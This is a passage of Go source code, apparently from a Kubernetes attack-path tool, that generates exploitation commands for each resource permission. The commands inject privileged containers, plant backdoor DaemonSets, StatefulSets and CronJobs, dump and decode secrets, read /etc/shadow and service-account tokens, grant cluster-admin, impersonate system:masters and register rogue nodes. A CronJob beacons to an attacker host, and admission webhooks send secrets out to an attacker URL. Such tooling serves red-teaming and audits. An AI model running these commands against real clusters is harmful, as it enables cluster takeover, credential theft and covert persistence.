kubectl %spatch pod <pod-name> --type=json -p='[{"op":"add","path":"/spec/containers/-","value":{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"],"securityContext":{"privileged":true}}}]'`, namespaceFlag)
		case "list", "get":
			return fmt.Sprintf("kubectl %sget pods -o wide --show-labels", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s pods", namespaceFlag, verb)
		}

	case "pods/exec":
		if pathType == "exfil" {
			return fmt.Sprintf("kubectl %sexec <pod-name> -- cat /etc/shadow /proc/self/environ", namespaceFlag)
		}
		return fmt.Sprintf("kubectl %sexec -it <pod-name> -- /bin/sh", namespaceFlag)

	case "pods/attach":
		return fmt.Sprintf("kubectl %sattach -it <pod-name>", namespaceFlag)

	case "pods/portforward":
		return fmt.Sprintf("kubectl %sport-forward <pod-name> 8080:80", namespaceFlag)

	case "pods/log":
		return fmt.Sprintf("kubectl %slogs <pod-name> --all-containers --prefix", namespaceFlag)

	// --- Workload creation ---
	case "deployments":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a deployment with a privileged service account
kubectl %screate deployment backdoor --image=alpine -- sh -c "sleep 3600"
# Then patch to use a privileged SA:
kubectl %spatch deployment backdoor -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>"}}}}'`, namespaceFlag, namespaceFlag)
		case "patch", "update":
			return fmt.Sprintf(`# Modify deployment to inject a backdoor container or change the service account
kubectl %spatch deployment <deployment-name> -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>","containers":[{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"]}]}}}}'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s deployments", namespaceFlag, verb)
		}

	case "daemonsets":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a DaemonSet to run on every node (persistence + lateral movement)
kubectl %sapply -f - <<'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-backdoor
spec:
  selector:
    matchLabels: {app: node-backdoor}
  template:
    metadata:
      labels: {app: node-backdoor}
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: backdoor
        image: alpine
        command: ["sh", "-c", "sleep 3600"]
        securityContext: {privileged: true}
        volumeMounts: [{name: host, mountPath: /host}]
      volumes: [{name: host, hostPath: {path: /}}]
EOF`, namespaceFlag)
		case "patch", "update":
			return fmt.Sprintf(`kubectl %spatch daemonset <ds-name> -p '{"spec":{"template":{"spec":{"containers":[{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"],"securityContext":{"privileged":true}}]}}}}'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s daemonsets", namespaceFlag, verb)
		}

	case "statefulsets":
		switch verb {
		case "create":
			return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: backdoor-sts
spec:
  serviceName: backdoor
  replicas: 1
  selector:
    matchLabels: {app: backdoor}
  template:
    metadata:
      labels: {app: backdoor}
    spec:
      serviceAccountName: <target-sa>
      containers:
      - name: shell
        image: alpine
        command: ["sh", "-c", "sleep 3600"]
EOF`, namespaceFlag)
		case "patch", "update":
			return fmt.Sprintf(`kubectl %spatch statefulset <sts-name> -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>"}}}}'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s statefulsets", namespaceFlag, verb)
		}

	case "replicasets":
		switch verb {
		case "create":
			return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: backdoor-rs
spec:
  replicas: 1
  selector:
    matchLabels: {app: backdoor}
  template:
    metadata:
      labels: {app: backdoor}
    spec:
      serviceAccountName: <target-sa>
      containers:
      - name: shell
        image: alpine
        command: ["sh", "-c", "sleep 3600"]
EOF`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s replicasets", namespaceFlag, verb)
		}

	case "jobs":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a job with a privileged service account
kubectl %screate job pwn --image=alpine -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# Or with a target SA:
kubectl %sapply -f - <<'EOF'
apiVersion: batch/v1
kind: Job
metadata:
  name: exfil-job
spec:
  template:
    spec:
      serviceAccountName: <target-sa>
      containers:
      - name: exfil
        image: alpine
        command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token"]
      restartPolicy: Never
EOF`, namespaceFlag, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s jobs", namespaceFlag, verb)
		}

	case "cronjobs":
		return fmt.Sprintf(`# Create a CronJob for persistent access
kubectl %sapply -f - <<'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistent-access
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: <target-sa>
          containers:
          - name: beacon
            image: alpine
            command: ["sh", "-c", "wget -q -O- http://<attacker>/beacon"]
          restartPolicy: Never
EOF`, namespaceFlag)

	// --- RBAC Escalation ---
	case "clusterrolebindings":
		if verb == "create" {
			return fmt.Sprintf("kubectl create clusterrolebinding escalate-binding --clusterrole=cluster-admin --user=%s", principal)
		}
		return fmt.Sprintf("kubectl %s%s clusterrolebindings", namespaceFlag, verb)

	case "rolebindings":
		if verb == "create" {
			return fmt.Sprintf("kubectl %screate rolebinding escalate-binding --clusterrole=admin --user=%s", namespaceFlag, principal)
		}
		return fmt.Sprintf("kubectl %s%s rolebindings", namespaceFlag, verb)

	case "clusterroles":
		switch verb {
		case "bind":
			return fmt.Sprintf("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=%s", principal)
		case "escalate":
			return fmt.Sprintf(`# Escalate a role to add permissions you don't have
kubectl patch clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`)
		case "update", "patch":
			return fmt.Sprintf(`# Modify a ClusterRole to add cluster-admin equivalent permissions
kubectl %s %s clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`, verb, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s clusterroles", namespaceFlag, verb)
		}

	case "roles":
		switch verb {
		case "bind":
			return fmt.Sprintf("kubectl %screate rolebinding pwn --clusterrole=admin --user=%s", namespaceFlag, principal)
		case "escalate":
			return fmt.Sprintf(`# Escalate a namespaced role to add permissions you don't have
kubectl %spatch role <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s roles", namespaceFlag, verb)
		}

	// --- Impersonation ---
	case "users":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as=system:admin %sget secrets --all-namespaces", namespaceFlag)
		}
	case "groups":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as-group=system:masters --as=dummy %sget secrets --all-namespaces", namespaceFlag)
		}
	case "serviceaccounts":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as=system:serviceaccount:kube-system:default %sget secrets", namespaceFlag)
		}
	case "userextras/*":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as=system:admin --as-group=system:masters %sget secrets --all-namespaces", namespaceFlag)
		}

	// --- Service Account Tokens ---
	case "serviceaccounts/token":
		return fmt.Sprintf("kubectl %screate token <service-account-name>", namespaceFlag)

	case "tokenrequests":
		return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
apiVersion: authentication.k8s.io/v1
kind: TokenRequest
metadata:
  name: <sa-name>
  namespace: <namespace>
spec:
  audiences: ["https://kubernetes.default.svc"]
  expirationSeconds: 86400
EOF`, namespaceFlag)

	// --- Node Access ---
	case "nodes":
		switch verb {
		case "create":
			return `# Register a rogue node to steal secrets
# Requires crafting a Node object and faking kubelet - see: https://github.com/nicholasgasior/fake-kubelet
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Node
metadata:
  name: rogue-node
  labels:
    kubernetes.io/os: linux
EOF`
		case "update", "patch":
			return fmt.Sprintf(`# Modify node labels/taints to attract pods with secrets
kubectl %s %s node <node-name> -p '{"metadata":{"labels":{"special":"true"}}}'`, verb, namespaceFlag)
		case "proxy":
			return `# Proxy to kubelet API for pod listing and exec
# List pods: kubectl get --raw "/api/v1/nodes/<node>/proxy/pods"
# Exec: kubectl get --raw "/api/v1/nodes/<node>/proxy/run/<namespace>/<pod>/<container>?cmd=id"
kubectl get --raw "/api/v1/nodes/<node-name>/proxy/pods"`
		case "get", "list":
			return fmt.Sprintf("kubectl %sget nodes -o wide", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s nodes", namespaceFlag, verb)
		}

	// --- Webhooks ---
	case "validatingwebhookconfigurations":
		switch verb {
		case "create", "update", "patch":
			return `# Create/modify a validating webhook to intercept and deny all requests (DoS)
# Or redirect to attacker-controlled endpoint to exfil request data
kubectl apply -f - <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: exfil-webhook
webhooks:
- name: exfil.attacker.com
  clientConfig:
    url: "https://<attacker>/webhook"
  rules:
  - apiGroups: [""]
    resources: ["secrets"]
    apiVersions: ["v1"]
    operations: ["CREATE","UPDATE"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF`
		default:
			return fmt.Sprintf("kubectl %s%s validatingwebhookconfigurations", namespaceFlag, verb)
		}

	case "mutatingwebhookconfigurations":
		switch verb {
		case "create", "update", "patch":
			return `# Create/modify a mutating webhook to inject sidecars, modify env vars, or change images
kubectl apply -f - <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: inject-webhook
webhooks:
- name: inject.attacker.com
  clientConfig:
    url: "https://<attacker>/mutate"
  rules:
  - apiGroups: [""]
    resources: ["pods"]
    apiVersions: ["v1"]
    operations: ["CREATE"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF`
		default:
			return fmt.Sprintf("kubectl %s%s mutatingwebhookconfigurations", namespaceFlag, verb)
		}

	// --- Certificates ---
	case "certificatesigningrequests/approval":
		return `# Approve a CSR to generate a valid client certificate
# 1. Create a CSR: openssl req -new -key key.pem -out csr.pem -subj "/CN=system:admin/O=system:masters"
# 2. Submit: kubectl apply -f csr.yaml
# 3. Approve: kubectl certificate approve <csr-name>
kubectl certificate approve <csr-name>`

	// --- Secrets ---
	case "secrets":
		switch verb {
		case "get":
			if pathType == "exfil" {
				return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", namespaceFlag)
			}
			return fmt.Sprintf("kubectl %sget secrets -o yaml", namespaceFlag)
		case "list":
			if pathType == "exfil" {
				return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[] | {name: .metadata.name, type: .type, data: (.data | map_values(@base64d))}'", namespaceFlag)
			}
			return fmt.Sprintf("kubectl %sget secrets", namespaceFlag)
		case "*":
			return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s secrets", namespaceFlag, verb)
		}

	// --- ConfigMaps ---
	case "configmaps":
		switch verb {
		case "get", "list":
			return fmt.Sprintf("kubectl %sget configmaps -o yaml", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s configmaps", namespaceFlag, verb)
		}

	// --- Services / Endpoints ---
	case "services":
		return fmt.Sprintf("kubectl %sget services -o wide", namespaceFlag)

	case "endpoints":
		return fmt.Sprintf("kubectl %sget endpoints -o wide", namespaceFlag)

	// --- Network policies ---
	case "networkpolicies":
		switch verb {
		case "delete":
			return fmt.Sprintf("kubectl %sdelete networkpolicy <policy-name>", namespaceFlag)
		case "update", "patch":
			return fmt.Sprintf(`# Modify network policy to allow all traffic
kubectl %spatch networkpolicy <policy-name> --type=json -p='[{"op":"replace","path":"/spec/ingress","value":[{}]},{"op":"replace","path":"/spec/egress","value":[{}]}]'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s networkpolicies", namespaceFlag, verb)
		}

	// --- Namespaces ---
	case "namespaces":
		return fmt.Sprintf("kubectl %sget namespaces", namespaceFlag)

	// --- Ingresses ---
	case "ingresses":
		switch verb {
		case "update", "patch":
			return fmt.Sprintf(`# Modify ingress to redirect traffic to attacker endpoint
kubectl %spatch ingress <ingress-name> --type=json -p='[{"op":"replace","path":"/spec/rules/0/http/paths/0/backend/service/name","value":"attacker-svc"}]'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s ingresses", namespaceFlag, verb)
		}

	// --- PersistentVolumes ---
	case "persistentvolumes":
		if verb == "create" {
			return `# Create a hostPath PV to access the node filesystem
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: PersistentVolume
metadata:
  name: node-root
spec:
  capacity: {storage: 100Gi}
  accessModes: [ReadWriteOnce]
  hostPath:
    path: /
    type: Directory
EOF`
		}
		return fmt.Sprintf("kubectl %s%s persistentvolumes", namespaceFlag, verb)

	case "persistentvolumeclaims":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a PVC to mount an existing PV with sensitive data
kubectl %sapply -f - <<'EOF'
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: data-access
spec:
  accessModes: [ReadWriteOnce]
  resources:
    requests: {storage: 10Gi}
  volumeName: <target-pv-name>
EOF`, namespaceFlag)
		case "get", "list":
			return fmt.Sprintf("kubectl %sget pvc -o wide", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s pvc", namespaceFlag, verb)
		}
	}

	// =========================================================================
	// Fallback: generic command
	// =========================================================================
	return fmt.Sprintf("kubectl %s%s %s", namespaceFlag, verb, resource)
}
